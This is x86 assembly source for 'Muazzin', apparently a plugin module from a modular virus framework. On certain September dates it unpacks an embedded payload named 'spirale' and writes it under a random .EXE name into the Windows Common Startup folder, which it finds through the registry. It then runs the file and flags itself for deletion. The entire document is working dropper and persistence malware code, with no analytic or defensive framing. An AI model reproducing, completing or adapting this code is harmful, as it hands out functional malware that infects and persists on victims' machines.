;Muazzin - drop spirale under random EXE file to /win/init/ and stealth it

BITS 32

%include "\muazzin\muazzin.asi"

TYPE    EQU "@@@@"
VERSION EQU 0200h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_APP
       jz .query
       call delta
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       call get_apis
       lea edi, [ebp+workb]
       push edi
       call [ebp+GetLocalTime]
       cmp word [edi+2], 9      ;month
       jne .exit
       cmp word [edi+6], 16
       je .activate
       cmp word [edi+6], 24	;day
       jne .exit
  .activate:
       pushad
       call install
       popad
       mov dword [esi+m_result], MR_DONE+MR_DELETE
       ret 4
  .exit:
       mov dword [esi+m_result], MR_DONE
       ret 4

  .query:
       test dword [esi+m_why], MT_QUERY
       jz .exit
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

get_apis:
       pushad
       lea eax, [ebp+skernel32]
       push eax
       call [ebp+getmhnd]
       mov [ebp+kernel32], eax
       lea esi, [ebp+_apis]
       mov edi, esi
  .loop:
       lodsd
       test eax, eax
       jz .done
       add eax, ebp
       push eax
       push dword [ebp+kernel32]
       call [ebp+getpaddr]
       stosd
       jmp .loop
  .done:
       popad
       ret

install:
       call delta

       call .tmp111
       db "ADVAPI32.DLL",0
 .tmp111:
       call [ebp+LoadLibraryA]

       call .tmp222
       db "RegOpenKeyExA",0
 .tmp222:
       push eax
       call .tmp223
       db "RegQueryValueExA",0
 .tmp223:
       push eax
       call .tmp224
       db "RegCloseKey",0
 .tmp224:
       push eax
       call [ebp+getpaddr]
       mov [ebp+RegCloseKey], eax
       call [ebp+getpaddr]
       mov [ebp+RegQueryValueExA], eax
       call [ebp+getpaddr]
       mov [ebp+RegOpenKeyExA], eax

       lea esi, [ebp+workb+200h]
       push esi
       call .tmp
%include "spirale.inc"
  .tmp:
       call _aP_depack_asm
       lea edi, [esi-200h]

       push byte 0
       push esp ;pkresult
       push byte 1
       push byte 0
       call .tmp000
       db "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",0
  .tmp000:
       push dword 80000002h
       call [ebp+RegOpenKeyExA]
       test eax, eax
       pop ebx
       jne near .fuck

       push dword 200h
       push esp
       push edi
       push byte 0
       push byte 0
       call .tmp666
       db "Common Startup",0
  .tmp666:
       push ebx
       call [ebp+RegQueryValueExA]
       pop eax
       add edi, eax

       push ebx
       call [ebp+RegCloseKey]

       mov byte [edi-1], "\"
       push byte 8
       pop ecx
       call random
  .nameloop:
       and al, 0111b
       sub al, -"0"
       stosb
       rol eax, cl
       sub eax, esp
       loop .nameloop
       mov eax, ".EXE"
       stosd
       sub eax, eax
       stosd

       lea edi, [ebp+workb]
       push byte 0
       push dword 83h
       push byte 2
       push byte 0
       push byte 0
       push dword 0c0000000h
       push edi
       call [ebp+CreateFileA]
       mov ebx, eax
       inc eax
       jz .fuck
       push byte 0
       mov eax, esp
       push byte 0
       push eax
       push dword 10000
       push esi
       push ebx
       call [ebp+WriteFile]
       mov [esp], ebx
       call [ebp+CloseHandle]
  .fuck:
       push byte 0
       push edi
       call [ebp+WinExec]
       ret

random:
       push ecx
       push edx
       call [ebp+GetTickCount]
       sub edx, edx
       mov ecx, 8
  .shuffle:
       add eax, eax
       jnc .skip
       mul ecx
       xor eax, edx
  .skip:
       ror eax, cl
       loop .shuffle
       pop edx
       pop ecx
       ret

%include "\unpack.asi"

skernel32 db 'KERNEL32', 0

api000 db "LoadLibraryA", 0
api001 db "WinExec", 0
api002 db "CreateFileA", 0
api003 db "WriteFile", 0
api004 db "CloseHandle", 0
api005 db "GetTickCount", 0
api006 db "GetLocalTime", 0

_apis:

LoadLibraryA        dd api000
WinExec             dd api001
CreateFileA         dd api002
WriteFile           dd api003
CloseHandle         dd api004
GetTickCount        dd api005
GetLocalTime        dd api006
                    dd 0

RegOpenKeyExA    dd -1
RegQueryValueExA dd 0
RegCloseKey      dd 0

kernel32 dd 0
getpaddr dd 0
getmhnd  dd 0

workb:
